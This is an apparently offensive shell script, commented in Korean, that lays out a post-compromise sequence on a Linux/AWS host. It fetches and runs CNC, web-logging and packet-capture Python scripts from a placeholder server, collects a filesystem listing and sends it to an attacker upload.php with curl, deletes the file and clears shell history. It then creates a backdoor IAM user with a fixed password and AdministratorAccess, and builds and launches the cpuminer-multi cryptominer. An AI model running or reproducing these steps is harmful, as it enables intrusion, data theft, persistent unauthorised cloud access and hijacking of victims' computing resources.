#파일 다운로드
wget [server]/upload/CNC.py
wget [server]/upload/web_user_log.py
wget [server]/upload/pcap.py

# 1. run malicious
nohup sudo python3 CNC.py &
nohup sudo python3 web_user_log.py &
nohup sudo python3 pcap.py &

# 1-2. Collect & Exfiltrate Data, then Clean up
# 시스템 정보 수집 (루트 파일 시스템 목록을 예시로 사용)
echo "### System Files ###" > /tmp/collected_info.txt
ls -al / >> /tmp/collected_info.txt

# 수집된 정보를 공격자 서버로 유출 (upload.php를 통해 전송)
curl -F "file=@/tmp/collected_info.txt" [server]/upload.php

# 흔적 삭제
rm -f /tmp/collected_info.txt
history -c

# 2. create iam user
aws iam create-user --user-name ExampleUser
aws iam attach-user-policy --user-name ExampleUser --policy-arn arn:aws:iam::aws:policy/IAMUserChangePassword
aws iam create-login-profile --user-name ExampleUser --password Password123! --password-reset-required
aws iam attach-user-policy --user-name ExampleUser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. install package
sudo yum install -y g++ zlib-devel git gcc make autoconf automake libtool libcurl-devel openssl-devel
git clone https://github.com/tpruvot/cpuminer-multi
cd cpuminer-multi
./build.sh
./cpuminer &

